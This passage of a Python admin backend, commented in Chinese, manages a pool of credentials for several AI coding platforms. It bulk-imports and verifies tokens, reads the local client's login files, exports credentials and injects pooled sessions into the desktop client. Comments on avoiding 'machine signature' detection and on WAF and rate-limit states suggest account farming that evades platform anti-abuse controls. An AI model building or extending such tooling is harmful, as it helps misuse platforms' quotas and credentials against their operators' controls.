        from admin.platform.wps_lingxi.services import accounts as svc

        svc.sync_quota(db, account)
        return
    if storage == "codearts":
        from admin.platform.codearts.services import accounts as svc

        svc.sync_quota(db, account)
        return
    if storage == "raccoon":
        from admin.platform.raccoon.services import accounts as svc

        svc.sync_quota(db, account)
        return
    if storage == "minimax":
        from admin.platform.minimax.services import accounts as svc

        svc.sync_quota(db, account)
        return
    # 默认平台（WorkBuddy）：走通用余额刷新
    _refresh_balance(account)


def _check_one(storage: str, account: Account, db: Session) -> None:
    """批量「检测」：只探活并标记状态，不改凭证。"""
    try:
        from admin import account_health

        account_health.probe_account(db, account)
        return
    except Exception:  # noqa: BLE001 - 没有通用探针就回落
        pass
    _refresh_one(storage, account, db)


@router.post("/batch")
def batch_add(body: AccountBatchIn, _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """批量上传：逐条做**结构校验 + 真实上游验证**，不合格的记进 errors 并跳过。

    `verify` 默认为 True。批量上传时如果每条都真调上游会慢（每条 1-2 次请求），
    但对「拒绝伪造凭证」这个要求来说这是必须的 —— 结构校验挡不住伪造签名。
    调用方若明确只想快速导入（例如刚从本机导出、已知有效），可显式传
    `verify=False` 跳过上游验证，但**结构校验永远执行**。
    """
    return _batch_add_core(body, db)


def _batch_add_core(body: AccountBatchIn, db: Session,
                    on_progress: "Callable[[int, int], None] | None" = None) -> dict:
    """批量导入：结构校验 + 上游验证 + 落库。

    ## 为什么要把「验证」和「落库」拆成两段

    原实现是一条一条串行跑的，每条要打**两次**上游（`probe_credential_live`
    验证 + `_refresh_balance` 再取一次余额），外加每条 `commit()` + `refresh()`。
    实测单条约 0.7~1.5 秒，1000 个号就是 20 分钟起步 —— 用户说的「几百几千
    几万个要等半天」就是这个。

    现在：

      1. **验证段并发**（默认 8 路）：纯网络 + 字符串处理，不碰 Session，
         所以可以安全地丢进线程池；上游验证一次就把 balance 一起带回来，
         不再重复取第二次余额。
      2. **落库段串行批量**：`flush()` 拿自增 id（不再每条 `refresh()`），
         每 200 条提交一次；单条失败只记账，不影响整批。

    进度按**已处理条数**上报（含被跳过的），进度条不会卡住。
    """
    items = list(body.items or [])
    total = len(items)
    errors: list[str] = []
    if total == 0:
        return {"added": 0, "skipped": 0, "errors": ["没有提供任何账号凭证"]}

    from concurrent.futures import ThreadPoolExecutor, as_completed

    verify = bool(body.verify)

    def _prepare(item) -> tuple[dict | None, str]:
        """线程里跑：只做校验与上游探测，**不碰数据库**。"""
        try:
            raw = normalize_credential(item.auth_json or "")
        except CredentialDecodeError as exc:
            return None, f"跳过一条：{exc}"
        except Exception as exc:  # noqa: BLE001 - 单条坏数据不阻断
            return None, f"跳过一条：{str(exc)[:120]}"
        chk = wb_login.validate_credential(raw)
        if not chk.ok:
            return None, f"跳过一条：不是有效的客户端凭证（{chk.reason}）"
        if not verify:
            return {"raw": raw, "profile": {}, "balance": {}}, ""
        # 轻量档（with_profile=False）：批量导入每号只打**一次**上游
        # （billing/meter 积分接口）—— 它本身就是鉴权探测（伪造/失效令牌
        # 在这里就 401 / 令牌失效码），还顺带把真实积分带回来。
        # 省掉的 fetch_account_profile 是第二段串行往返，几百个号就是
        # 几分钟（用户反馈「导入太卡太慢」的剩余大头）。防「真凭证套
        # 别人 uid」的交叉比对保留在单条手工添加，那里不走这个开关。
        probe = wb_login.probe_credential_live(raw, with_profile=False)
        if not probe.ok:
            return None, f"跳过一条：未通过上游验证（{probe.message}）"
        return ({"raw": raw, "profile": probe.profile or {},
                 "balance": probe.balance or {}}, "")

    # ---- 1) 并发验证 ----
    prepared: list[tuple[dict | None, str]] = [({}, "")] * total
    done = 0
    # 8 路足够把 RTT 藏起来；再多只会把上游/本机 socket 打满，收益递减。
    # **不再让小批量退化成串行**：旧规则是 `total < 8 -> workers=1`，
    # 于是导 7 个号要跑 7 次串行上游往返（单次实测 1.2 秒，网络差时能顶到
    # 15 秒超时）—— 这正是「才一二十个账号也觉得卡」的来源。
    # 现在按条数给并发，上限 16（与各平台 import_batch 的默认值一致）。
    workers = 1 if not verify else max(1, min(16, total))
    if workers > 1:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_prepare, it): i for i, it in enumerate(items)}
            for future in as_completed(futures):
                index = futures[future]
                try:
                    prepared[index] = future.result()
                except Exception as exc:  # noqa: BLE001
                    prepared[index] = (None, f"跳过一条：{str(exc)[:120]}")
                done += 1
                if on_progress:
                    on_progress(done, total)
    else:
        for index, item in enumerate(items):
            prepared[index] = _prepare(item)
            done += 1
            if on_progress:
                on_progress(done, total)

    # ---- 2) 落库（串行、批量提交） ----
    added = 0
    skipped = 0
    seen = _existing_uid_index(db)
    pending = 0
    #: 落库后需要补刷余额的账号 id（并发刷，见下方第 3) 段）
    needs_refresh: list[int] = []

    #: 每条记录落库后立即提交（「导一个算一个」）。
    #:
    #: 用户的原话：「导入不用堵塞，确保是异步操作，就是导一个算一个而不是等
    #: 全部导入成功才算导，一个一个导进来，哪怕卡死也只是导入进卡死前的账号」。
    #:
    #: 原来固定 200 条提交一次 —— 十几个号的批次等于**整批只在最后提交一次**，
    #: 中途一卡死，前面成功的也全丢了，用户看到「导入报错、号一个没进来」。
    #:
    #: 大批次（>500）退化成每 20 条一次：几千条逐条 commit 的 fsync 太贵，
    #: 而每 20 条的丢失窗口已经足够小。
    commit_every = 1 if total <= 500 else 20

    def _flush(every: int | None = None) -> None:
        nonlocal pending
        pending += 1
        if pending >= (every or commit_every):
            db.commit()
            pending = 0

    for index, item in enumerate(items):
        payload, error = prepared[index]
        if payload is None:
            if error:
                errors.append(error)
            continue
        try:
            raw = payload["raw"]
            profile = payload["profile"]
            balance = payload["balance"]
            uid = str(profile.get("uid") or _uid_of(raw) or "")
            if uid and uid in seen:
                old = seen[uid]
                _apply_meta(old, raw,
                            profile=profile if verify else None,
                            balance=balance if verify else None)
                _flush()
                _post_login_automation(old.id, old.name or old.uid)
                skipped += 1
                continue
            acc = Account(name=clean_display_name(item.name)) if item.name else Account()
            _apply_meta(acc, raw, profile=profile, balance=balance)
            db.add(acc)
            # flush 只发 INSERT、拿回自增 id，比 refresh（多一次 SELECT）便宜得多
            db.flush()
            if uid:
                seen[uid] = acc
            _post_login_automation(acc.id, acc.name or acc.uid)
            # 验证阶段已经带回余额的，不再重复打一次上游；
            # 没带回的（例如 verify=False 的大批量导入）先记下来，
            # 落库完成后**并发**补刷 —— 逐条串行刷是 1.2 秒/号，
            # 几百个号就是十几分钟（用户说的「导入卡死」）。
            if balance and (balance.get("total") is not None
                            or balance.get("remain") is not None):
                added += 1
            else:
                needs_refresh.append(int(acc.id or 0))
                added += 1
            _flush()
        except Exception as exc:  # noqa: BLE001 - 单条失败不影响整批
            db.rollback()
            pending = 0
            errors.append(f"跳过一条：{str(exc)[:120]}")
    try:
        db.commit()
    except Exception as exc:  # noqa: BLE001
        db.rollback()
        errors.append(f"收尾提交失败：{str(exc)[:160]}")

    # ---- 3) 余额补刷：后台并发（独立 Session）----
    # 以前刷新失败会 append 到 errors，前端弹「N 个失败」，可账号其实
    # 已经落库；现在只记后台日志，HTTP 也不再等上游。
    if needs_refresh:
        _refresh_pending_async(needs_refresh)
    return {"added": added, "skipped": skipped, "errors": errors,
            "refreshing": len(needs_refresh)}


@router.get("/duplicates")
def list_duplicates(_: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """列出 uid 重复的账号组（每组保留一条，其余是可清理的冗余）。"""
    rows = db.query(Account).order_by(Account.id.asc()).all()
    groups: dict[str, list[Account]] = {}
    for a in rows:
        if a.uid:
            groups.setdefault(a.uid, []).append(a)

    out = []
    for uid, grp in groups.items():
        if len(grp) < 2:
            continue
        keep = grp[0]                      # id 最小 = 最早创建，通常历史记录最全
        out.append({
            "uid": uid,
            "keep": {"id": keep.id, "name": keep.name,
                     "created_at": _dt(keep.created_at)},
            "remove": [{"id": a.id, "name": a.name,
                        "created_at": _dt(a.created_at)} for a in grp[1:]],
        })
    return {
        "total": len(rows),
        "unique": len(groups),
        "groups": out,
        "redundant": sum(len(g["remove"]) for g in out),
    }


@router.post("/dedupe")
def dedupe_accounts(_: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """清理重复账号：同一 uid 只保留 id 最小（最早创建）的那条。

    为什么保留最早的那条：使用记录（last_used_at）与既有关联数据都挂在
    老记录上，重复导入产生的新记录这些字段都是空的，删掉损失最小。
    """
    rows = db.query(Account).order_by(Account.id.asc()).with_for_update().all()
    groups: dict[str, list[Account]] = {}
    for a in rows:
        if a.uid:
            groups.setdefault(a.uid, []).append(a)

    removed: list[dict] = []
    bound_ids = {k.account_id for k in db.query(ApiKey).filter(ApiKey.account_id.is_not(None)).with_for_update().all()}
    for uid, grp in groups.items():
        keep = next((a for a in grp if a.id in bound_ids), grp[0])
        for a in grp:
            if a.id == keep.id or a.id in bound_ids:
                continue
            removed.append({"id": a.id, "name": a.name, "uid": uid})
            db.delete(a)
    db.commit()
    return {"removed": len(removed), "kept": len(groups), "items": removed}


def _dt(v) -> str:
    return v.strftime("%Y-%m-%d %H:%M:%S") if v else ""


@router.get("/scan-local")
def scan_local(request: Request = None, _: bool = Depends(require_admin),
               db: Session = Depends(get_db)):
    """扫描本机 WorkBuddy/CodeBuddy 登录态目录，列出发现的账号（不读 token 内容到前端）。

    **号池交叉对比放在服务端做**：早先前端为了建一个 uid 集合去 `GET /api/accounts`，
    而那个接口是全量返回（且逐行解析 auth_json 算令牌徽标）。账号池到几千几万条时，
    点「扫描本机」会像死了一样没有任何反应 —— 用户看到的就是"按钮点不了"。
    这里改成只按扫描到的几十个 uid 做一次 IN 查询 + 两次 count，与池子大小无关。
    """
    d = _client_auth_dir()
    if not os.path.isdir(d):
        return {"dir": d, "exists": False, "active_uid": None, "items": [],
                "pool_total": 0, "pool_only": 0, "pool_only_sample": []}
    active_uid = None
    active_file = os.path.join(d, "workbuddy-desktop.info")
    if os.path.exists(active_file):
        try:
            with open(active_file, encoding="utf-8-sig") as source:
                active_uid = (json.load(source).get("account") or {}).get("uid")
        except Exception:
            pass
    items = []
    seen_uids = set()  # 按 uid 去重
    for f in sorted(glob.glob(os.path.join(d, "*.info"))):
        base = os.path.basename(f)
        if base.endswith(".bak") or ".bak-" in base:
            continue
        try:
            with open(f, encoding="utf-8-sig") as source:
                data = json.load(source)
        except Exception:
            continue
        credential_error = ''
        try:
            data = json.loads(normalize_credential(json.dumps(data)))
        except CredentialDecodeError as exc:
            credential_error = str(exc)
        meta = backend.parse_auth_meta(json.dumps(data))
        uid = meta.get("uid") or ""
        # 同 uid 只保留一份（优先保留无时间戳后缀的"实时登录"文件）
        if uid in seen_uids:
            continue
        seen_uids.add(uid)
        # 提取 token 到期时间
        auth = data.get("auth") or {}
        expires_at = auth.get("expiresAt") or 0
        expires_str = ""
        if expires_at:
            try:
                expires_str = datetime.fromtimestamp(expires_at / 1000).strftime("%Y-%m-%d %H:%M:%S")
            except (OSError, ValueError):
                expires_str = str(expires_at)
        # 提取昵称：过滤字面量 "null" 字符串
        raw_nick = meta.get("nickname") or ""
        nickname = raw_nick if raw_nick.strip().lower() not in ("null", "", "none") else ""
        items.append({
            "file": base,
            "uid": uid,
            "nickname": nickname,
            "domain": meta.get("domain") or "",
            "is_active": (uid == active_uid),
            "expires_at": expires_str,
            "expires_ts": expires_at,
            "credential_error": credential_error,
        })

    # ---- 号池交叉对比（服务端做，不把全量账号发给前端）----
    from admin.platform import scope as platform_scope
    platform, realm = platform_scope.from_request(request)
    pool = db.query(Account)
    if platform:
        pool = platform_scope.filter_accounts(pool, db, platform, realm)

    scan_uids = [it["uid"] for it in items if it.get("uid")]
    existing: set[str] = set()
    if scan_uids:
        existing = {u for (u,) in pool.with_entities(Account.uid)
                    .filter(Account.uid.in_(scan_uids)).all() if u}
    for it in items:
        it["in_pool"] = it.get("uid") in existing

    pool_total = pool.with_entities(func.count(Account.id)).scalar() or 0
    only_q = pool.filter(Account.uid.isnot(None))
    if scan_uids:
        only_q = only_q.filter(~Account.uid.in_(scan_uids))
    pool_only = only_q.with_entities(func.count(Account.id)).scalar() or 0
    pool_only_sample = [u for (u,) in only_q.with_entities(Account.uid).limit(3).all() if u]

    return {"dir": d, "exists": True, "active_uid": active_uid, "items": items,
            "pool_total": pool_total, "pool_only": pool_only,
            "pool_only_sample": pool_only_sample}


def _refresh_one_account(acc_id: int, with_expiry: bool = True) -> tuple[int, bool, str]:
    """在工作线程里刷新**一个**账号的余额（独立 Session）。

    ⚠️ 本函数按名字被 tests/test_import_speed.py patch，**不要再定义同名函数**。
    曾经文件后面还有一个 `_refresh_one_account(db, account)`（批量刷新用），
    后定义覆盖了这里，导入刷新时 `account` 收到的其实是 `with_expiry`(bool)，
    直接 `AttributeError: 'bool' object has no attribute 'auth_json'` —— 账号
    在报错前已 commit，于是「点了导入报错，但号确实进来了」。那个函数现已
    改名 `_refresh_batch_account`。

    ## 为什么必须独立 Session

    SQLAlchemy 的 `Session` 不是线程安全的：并发导入时拿主线程那个会话
    去多线程里用，轻则串数据，重则 `This session is provisioning a new
    connection` 崩掉。这里每个线程自己开一个，互不干扰。

    返回 `(acc_id, 是否成功, 错误信息)`。
    """
    from admin.db import SessionLocal

    try:
        with SessionLocal() as s:
            acc = s.query(Account).filter(Account.id == acc_id).first()
            if acc is None:
                return acc_id, False, "账号已被删除"
            ok = _refresh_balance(acc, with_expiry=with_expiry)
            try:
                s.commit()
            except Exception as exc:  # noqa: BLE001
                s.rollback()
                return acc_id, False, str(exc)[:120]
            return acc_id, ok, "" if ok else "上游未返回余额"
    except Exception as exc:  # noqa: BLE001 - 单条失败不影响整批
        return acc_id, False, str(exc)[:120]


def _refresh_many(acc_ids: list[int], *, with_expiry: bool = True,
                  workers: int = 8) -> list[tuple[int, bool, str]]:
    """并发刷新一批账号的余额。

    ## 为什么不是 `for acc in rows: _refresh_balance(acc)`

    线上实测**单账号一次上游往返 1.2 秒**（fetch_balance 0.61s +
    fetch_credit_details 0.59s），网络差时单次能顶到 15 秒超时。
    串行跑 20 个号就是 24 秒起，几百个号直接「卡死」—— 用户反馈的
    「导入一个账号卡半天、几百个就卡死」就是这个串行 I/O。
    """
    if not acc_ids:
        return []
    from concurrent.futures import ThreadPoolExecutor

    n = max(1, min(int(workers or 1), len(acc_ids)))
    if n == 1:
        return [_refresh_one_account(i, with_expiry) for i in acc_ids]
    with ThreadPoolExecutor(max_workers=n) as pool:
        return list(pool.map(lambda i: _refresh_one_account(i, with_expiry), acc_ids))


def _refresh_pending_async(acc_ids: list[int]) -> None:
    """导入落库之后把余额刷新丢到**后台线程**，HTTP 立即返回。

    ## 为什么不能留在请求里等

    导入本身只是「读本机文件 + 落库」，毫秒级。但余额刷新每号要打
    `fetch_balance` + `fetch_credit_details` 两次上游往返（实测 ~1.2s，
    网络差时单次能顶到 15s 超时）。放在请求关键路径上有两个后果：

      1. 上游一慢，浏览器/代理超时 → 前端弹「导入失败」，可账号早就
         commit 了 —— 正是「报错了但号确实进来了」；
      2. 上游一抛异常，整个响应变 500，同上。

    对比 Loomy：它的导入是「读明文 auth-session.json + 一次 upsert +
    一次 points 探活」，单号只有一次上游往返，也没有逐包到期快照。
    WorkBuddy 这边是两次往返（余额 + 逐包快照），且上游一抖就把整个
    响应带成 500。让导入只做本地部分、余额交给后台线程后，上游再慢
    也只影响余额字段，不影响「导入成功」这个事实，也不会再把刷新
    失败算成导入失败。
    """
    if not acc_ids:
        return

    def _run() -> None:
        try:
            from admin.platform import shared as _platform_shared
            for acc_id, ok, why in _refresh_many(
                    acc_ids, with_expiry=True,
                    workers=min(_platform_shared.import_refresh_concurrency(),
                                len(acc_ids))):
                if not ok:
                    _logger.warning("导入后余额刷新失败 账号=%s 原因=%s",
                                    acc_id, why or "上游未返回")
        except Exception:  # noqa: BLE001 - 后台任务绝不能影响已入库数据
            _logger.exception("导入后余额刷新异常（不影响已入库账号）")

    threading.Thread(target=_run, name="import-balance-refresh",
                     daemon=True).start()


@router.post("/import-local")
def import_local(body: ImportLocalIn, _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """把本机登录态目录里的 .info 直接读入号池（服务端读取，不向前端暴露 token）。

    ## 为什么只做「落库」，余额交给后台

    旧实现对**每个文件**串行打上游，20 个号 = 24 秒；后来改成 8 路并发，
    但仍占着 HTTP 响应 —— 上游一慢或一抛异常，响应就变成 500，而账号
    在报错前已经 commit，用户看到的正是「导入报错、号却进来了」。
    现在：文件解析/落库同步完成（毫秒级，立即返回），余额交给后台线程，
    单条失败只记警告，既不等上游，也不会把刷新失败算成导入失败。
    """
    d = _client_auth_dir()
    if not os.path.isdir(d):
        raise HTTPException(status_code=500, detail=f"客户端登录目录不存在: {d}")
    names = list(body.files)
    if body.all or "all" in names:
        names = [
            os.path.basename(f) for f in glob.glob(os.path.join(d, "*.info"))
            if not (f.endswith(".bak") or ".bak-" in f)
        ]
    added = 0
    updated = 0
    skipped = 0
    errors = []
    #: 落库成功、待并发刷新余额的账号 id（串行打上游是原来最大的瓶颈）
    pending: list[int] = []
    seen = _existing_uid_index(db)   # 已存在的 uid 更新凭证；同批内也去重
    for name in names:
        path = os.path.join(d, name)
        if not os.path.isfile(path):
            errors.append(f"文件不存在: {name}")
            continue
        try:
            with open(path, encoding="utf-8-sig") as source:
                auth = source.read()
        except Exception:
            errors.append(f"{name}: 读取失败")
            continue
        try:
            auth = normalize_credential(auth)
        except CredentialDecodeError as exc:
            errors.append(f"{name}: {exc}")
            continue
        # 目录里的 *.info 未必都是凭证（可能有半截文件 / 别的 JSON），
        # 与上传入口用同一个校验器把关，避免把垃圾读进号池。
        chk = wb_login.validate_credential(auth)
        if not chk.ok:
            errors.append(f"{name}: 不是有效的客户端凭证（{chk.reason}）")
            continue
        meta = backend.parse_auth_meta(auth)
        uid = meta.get("uid")
        # ---- 已存在则**更新凭证**，不重复插入 ----
        #
        # 这里原来是「命中 uid 就 skipped++，什么都不做」。两个问题：
        #   1. 用户重新登录后 token 变了，导入却被跳过 -> 库里还是旧 token，
        #      表现为「明明重新登录过，却一直是失效状态」；
        #   2. 反而是**不认识的 uid** 每次都新建一行 —— 「导入本机」点几次
        #      就多几行重复账号。
        #
        # 正确语义：同一个 uid 只保留一行，重复导入只是**刷新它的凭证**。
        existing = seen.get(uid) if uid else None
        if existing is not None:
            try:
                _apply_meta(existing, auth)
                existing.status = "active"
                # 换凭证后旧的失败计数应当清零，否则刚刷新就被熔断挡住
                existing.session_dead_fails = 0
                existing.consecutive_fails = 0
                existing.cool_until = None
                existing.cool_kind = ""
                existing.last_err_msg = ""
                db.commit()
                # **不在这里打上游**：余额刷新统一放到下面并发跑。
                # `db.refresh()` 也去掉 —— commit 后紧接着一次 SELECT，
                # 只为了拿回刚落库的值，几百个号就是几百次白跑。
                pending.append(existing.id)
                updated += 1
                continue
            except Exception as exc:  # noqa: BLE001 - 更新失败按错误报，不新建
                errors.append(f"{name}: 更新既有账号失败（{exc}）")
                continue
        acc = Account()
        # 这是**本机客户端自己写的**登录态，可信度天然高于网页上传，
        # 故不做额外的上游验证；余额由下面的并发阶段补。
        _apply_meta(acc, auth)
        db.add(acc)
        db.commit()
        if uid:
            seen[uid] = acc
        pending.append(acc.id)
        added += 1

    # ---- 余额：后台并发刷新，不再占住 HTTP 响应 ----
    # 落库在上面的 db.commit() 就完成了；以前在这里同步等上游，一旦超时
    # 或抛异常就 500，前端报「导入失败」而账号其实已经进号池。
    if pending:
        _refresh_pending_async(pending)
    # `refreshed` 保留以兼容旧调用方：同步阶段刷新数恒为 0，
    # 后台待补的余额条数看 `refreshing`。
    return {"added": added, "updated": updated, "skipped": skipped,
            "refreshed": 0, "refreshing": len(pending), "errors": errors}


@router.get("/{acc_id}/export")
def export_one_account(
    acc_id: int,
    response: Response,
    format: Literal['backup', 'client'] = 'backup',
    _: bool = Depends(require_admin),
    db: Session = Depends(get_db),
):
    """Export a single backup or official encrypted .info file.

    `format=client` 只对 WorkBuddy 系账号生效（加密 .info 是 WorkBuddy
    客户端的文件格式）；其它平台的凭据结构不同，自动落回 **backup 原文**
    （auth_json 原样，可直接再导入），响应里的 `format` 是**实际格式**。
    """
    response.headers['Cache-Control'] = 'no-store'
    acc = db.query(Account).filter(Account.id == acc_id).first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")
    raw = (acc.auth_json or "").strip()
    if not raw:
        raise HTTPException(status_code=400, detail="该账号没有可导出的凭据")
    try:
        json.loads(raw)
    except Exception:
        raise HTTPException(status_code=400, detail="凭据内容不是合法 JSON，无法导出")
    effective = format
    if format == 'client' and not _uses_client_format(acc.platform):
        effective = 'backup'
    return {
        "id": acc.id,
        "name": acc.name,
        "uid": acc.uid,
        "platform": acc.platform,
        "format": effective,
        "item": _client_export(raw) if effective == 'client' else raw,
    }


@router.post("/{acc_id}/inject")
def inject_to_client(acc_id: int, body: InjectIn,
                     _: bool = Depends(require_admin),
                     db: Session = Depends(get_db)):
    """把号池里某账号注入成本机客户端的**当前登录态**。

    ## 为什么不是「写个文件回 200」就完事（2026-11-04 实测）

    旧实现只覆盖 `workbuddy-desktop.info`，接口恒 200 —— 但用户看到的是
    「注入失败了」：客户端把登录态放在内存里，刷新一次令牌就把文件整份
    重写回去（实测 11:26 注入、11:28 被覆盖），注入当场作废。

    现在交给平台模块 `client_session.inject()`：
      * `.info` 与它的 `.observation.json` 旁证**两个文件一起改**；
      * 原子写（先写临时文件再 replace），客户端永远读不到半份 JSON；
      * 写完读回来核对 uid，被覆盖就如实回报，不再假装成功；
      * 客户端在跑时明确告诉前端「必须重启才生效」，而不是让用户瞎试。

    响应里 `ok` 只代表「文件写成功」，**是否生效看 `verified`**。
    """
    acc = db.query(Account).filter(Account.id == acc_id).first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")
    if not body.confirm:
        raise HTTPException(status_code=400, detail="需要 confirm=true 才执行注入")
    platform = str(getattr(acc, "platform", "") or "").lower()
    if platform and platform not in ("workbuddy", "codebuddy"):
        raise HTTPException(
            status_code=409,
            detail=f"{platform} 的凭证无法注入 WorkBuddy 客户端（客户端只认本平台登录态）")

    raw = _client_export(acc.auth_json)
    from admin.platform.workbuddy.core import client_session

    uid = str(acc.uid or "")
    if not uid:
        # 少数账号 uid 列是空的（历史导入），从凭证里补一次
        try:
            payload = json.loads(normalize_credential(acc.auth_json))
            uid = str(((payload or {}).get("account") or {}).get("uid") or "")
        except Exception:  # noqa: BLE001
            uid = ""
    try:
        result = client_session.inject(payload=raw, uid=uid, name=acc.name or "",
                                       restart=bool(body.restart_client))
    except FileNotFoundError as exc:
        raise HTTPException(status_code=500, detail=str(exc)) from None
    except PermissionError:
        raise HTTPException(
            status_code=423,
            detail="客户端登录文件被占用（客户端正在写）。请完全退出 WorkBuddy 后重试，或勾选「注入后重启客户端」。") from None

    result["account"] = acc.name
    if result.get("overwritten"):
        result["hint"] = ("客户端在 1 秒内把登录态改回去了 —— 它内存里还持有一份旧会话。"
                          "请完全退出 WorkBuddy 再注入，或勾选「注入后重启客户端」。")
    elif result.get("needs_restart"):
        result["hint"] = ("文件已写入，但客户端正在运行，它会在下次刷新令牌时覆盖。"
                          "请重启 WorkBuddy 让注入生效。")
    return result


def _refresh_batch_account(db, account) -> dict:
    """按**账号所属平台**刷新它的余额与到期快照（「刷新全部」任务用）。

    原名 `_refresh_one_account`，与导入并发刷新的同名函数撞车 —— Python
    后定义覆盖前定义，导致 `import-local` 把 bool 当 Account 用而 500。
    改名后两者各司其职，勿再合并。

    ## 为什么必须分派（这是多平台下的关键）

    原来这里固定用 `backend.AccountSession` —— 那是 **WorkBuddy 的实现**。
    用它去刷 Trae / Qoder / Loomy 的账号时，上游会把它当鉴权失败：
    每个号必然失败一次，还会给好号加上 `session_dead_fails`，
    最后把健康账号标成「登录态失效」。账号一多，整批刷新就是「点了卡住」。

    平台自己的 `AccountOps.refresh()` 走各自的协议（COSY 签名 / icube /
    明文 token），并负责把余额写回统一列。
    """
    from admin.platform import registry

    storage = (getattr(account, "platform", "") or "").strip().lower()
    if storage in ("", registry.DEFAULT_PLATFORM):
        # 默认平台：保持原实现（要 AccountSession 拿 balance + 逐包快照）
        original = account.auth_json
        with backend.AccountSession(
                original,
                enterprise_id=(getattr(account, "enterprise_id", "") or "")) as session:
            try:
                balance = session.fetch_balance()
                account.balance_total = int(balance.get('total') or 0)
                account.balance_remain = int(balance.get('remain') or 0)
                account.last_sync_at = datetime.utcnow()
                summary = _sync_credit_snapshot(account, session.fetch_credit_details())
                complete = (summary.get('collection') or {}).get('complete', True)
                db.query(Account).filter(
                    Account.id == account.id,
                    Account.auth_json == original).update(
                    {Account.auth_json: session.updated_json()},
                    synchronize_session=False)
                db.commit()
                return {'ok': complete is True,
                        'status': 'refreshed' if complete else 'error',
                        'reason': '余额与到期快照已刷新' if complete
                                  else '余额已刷新，账单来源不完整，保留旧到期快照'}
            except Exception:
                db.rollback()
                raise

    spec = registry.spec_of_account(account)
    if spec is None or spec.storage() != storage:
        # 兜底：按落库名精确找。绝不退回默认平台 —— 拿 WorkBuddy 的协议
        # 去刷 Trae / Qoder 的账号，上游必然 502。
        spec = registry.spec_for_storage(storage)
    gateway = registry.load_platform_gateway(spec, account.domain or "") if spec else None
    ops = gateway.account_ops() if (gateway is not None
                                    and hasattr(gateway, "account_ops")) else None
    if ops is None or not hasattr(ops, "refresh"):
        return {'ok': False, 'status': 'skipped',
                'reason': '平台 %s 没有提供刷新实现' % (storage or '?')}
    result = ops.refresh(db, account.id, force=True) or {}
    ok = bool(result.get('ok', True))
    return {'ok': ok, 'status': 'refreshed' if ok else 'error',
            'reason': result.get('error') or result.get('message')
                      or ('余额已刷新' if ok else '刷新失败'),
            'platform': storage}


def _run_refresh_batch(ids, job):
    """批量刷新余额与到期快照（**并发**，见下）。

    ## 为什么不再串行

    原实现是这个形状：

        for account_id in ids:
            with maintenance.account_slot(account, db):   # 全局单飞 + 账号间 gap
                ...

    而 `account_slot` 里有**进程级 `_batch_lock`（非阻塞单飞）和
    `KEEPALIVE_ACCOUNT_GAP` 秒节流** —— 那是给「后台保活」设计的：
    连续高频刷新 token 是明显的机器特征。但「刷新余额」是用户**主动点的
    一次批量读操作**（`/points/balance` 之类），既不消耗额度也不改凭证，
    套上那两把锁的结果就是 **100 个号要 100 秒以上**，前端还只能干等。

    现在：按 `run_account_batch` 并发跑（默认 6 路），
    **保留真正有意义的保护**：
      · `_reason()` 跳过 waf / 冷却 / 熔断 / 登录已失效的号；
      · 每账号一把 `_Lease`，避免同一个号被并行刷两次；
      · 单号异常收敛成一条失败记录，不打断整批。
    并发度可用 `ADMIN_REFRESH_CONCURRENCY` 调整。
    """
    import os

    from admin import maintenance
    from admin.growth_center import identity
    from admin.growth_plan import _Lease
    from admin.scheduler import _account_label
    from admin.platform import shared as platform_shared

    job.set_phase('刷新账号余额与到期快照')
    ordered = list(dict.fromkeys(int(i) for i in ids if i))

    try:
        workers = int(os.getenv("ADMIN_REFRESH_CONCURRENCY", "6") or 6)
    except (TypeError, ValueError):
        workers = 6
    workers = max(1, min(16, workers))

    def worker(db, account):
        uid = identity(account)
        label = _account_label(account)
        item = {'account_id': account.id, 'account': label,
                'ok': False, 'status': 'error', 'reason': '未知错误'}
        job.beat(label)
        # 只跳过**真的有理由**的号（waf / 冷却 / 熔断 / 登录失效），
        # 不再因为「后台批量任务在跑」而整体串行。
        blocked = maintenance._reason(account)
        # 冷却中的号要**说清是哪一种冷却**：额度耗尽 vs 风控/熔断。
        # 原来统一「账号处于冷却/熔断/降权期」，用户看到 56 个号被跳过
        # 完全不知道是「没钱」还是「被封」，还以为刷新坏了。
        skip_text = ""
        if blocked == 'account_cooling':
            kind = str(getattr(account, 'cool_kind', '') or '')
            if kind == 'quota' or int(getattr(account, 'balance_remain', 0) or 0) <= 0:
                skip_text = '额度已耗尽，余额同步到额度后自动恢复，已跳过'
            else:
                skip_text = '账号处于冷却期（%s），已跳过' % (kind or '上游限流')
        lease = _Lease(db, 'account_refresh:' + uid + ':lease')
        try:
            if blocked:
                item.update(status='skipped', skip_reason=blocked,
                            reason=skip_text or maintenance.skip_reason_text(blocked))
            elif not lease.acquire():
                item.update(status='skipped', reason='账号正在刷新，已跳过重复执行')
            else:
                try:
                    item.update(_refresh_batch_account(db, account))
                except Exception as error:
                    db.rollback()
                    evidence = _remember_upstream_error(account, error)
                    db.commit()
                    item.update(
                        status='error',
                        reason=(f"本网关：刷新失败；上游 HTTP="
                                f"{evidence['http_status'] or '未记录'} / code="
                                f"{evidence['code'] or '未返回'}；原文：{evidence['raw']}"),
                        upstream_error=evidence)
                finally:
                    try:
                        lease.release()
                    except Exception:
                        db.rollback()
        finally:
            job.add_item(item)
        return item

    detail = platform_shared.run_account_batch(
        ordered, worker, concurrency=workers, label='refresh-batch')

    refreshed = sum(item['status'] == 'refreshed' for item in detail)
    failed = sum(item['status'] == 'error' for item in detail)
    skipped = sum(item['status'] == 'skipped' for item in detail)
    return {'ok': failed == 0, 'total': len(detail), 'refreshed': refreshed,
            'failed': failed, 'skipped': skipped, 'detail': detail,
            'summary': f'刷新完成：共 {len(detail)} 个账号，成功 {refreshed} 个，'
                       f'失败 {failed} 个，跳过 {skipped} 个'}


@router.post('/refresh-batch')
def refresh_batch(body: RefreshBatchIn | None = None,
                  request: Request = None,
                  _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """批量刷新余额与到期快照。

    **只刷指定账号 / 当前平台**，绝不退化成「全库」：
    原来这里是 `db.query(Account).all()`，多平台部署下会拿默认平台的
    协议去刷所有平台的账号，每个号必然失败一次，账号一多就是「点了卡住」
    （2026-10-31 实测复现）。前端现在会显式传 `account_ids`。
    """
    from admin.platform import scope as platform_scope

